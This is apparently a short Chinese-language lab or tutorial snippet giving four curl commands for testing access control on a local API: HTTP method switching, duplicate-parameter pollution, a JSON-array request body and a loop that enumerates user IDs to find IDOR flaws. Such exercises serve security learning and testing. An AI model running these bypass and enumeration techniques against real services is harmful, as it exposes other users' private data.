# 搞崩 1：HTTP Method 绕过
# 如果 GET /api/orders/2 被权限拦截了，试试：
curl -X POST http://localhost:5000/api/orders/2 -H "Authorization: Bearer ***"
# 有些框架只拦截了 GET，忘了 POST/DELETE

# 搞崩 2：参数污染
# 试试传两个 user_id 参数：
curl "http://localhost:5000/api/orders?user_id=1&user_id=2" -H "Authorization: Bearer ***"
# 后端可能取了第二个参数，WAF 只检查了第一个

# 搞崩 3：JSON 注入参数
# 把请求体改成数组：
curl -X POST http://localhost:5000/api/orders \
  -H "Authorization: Bearer ***" \
  -H "Content-Type: application/json" \
  -d '[{"user_id": 2, "action": "delete"}]'
# 如果后端用 for 循环处理数组，可能绕过单条检查

# 搞崩 4：爬虫遍历所有用户ID
for i in $(seq 1 100); do
  curl "http://localhost:5000/api/users/$i" -H "Authorization: Bearer ***"
done
# 如果某个 ID 返回了数据，且不是你自己的，就是越权
# 批量跑这个脚本，你会发现很多意想不到的 ID 能访问
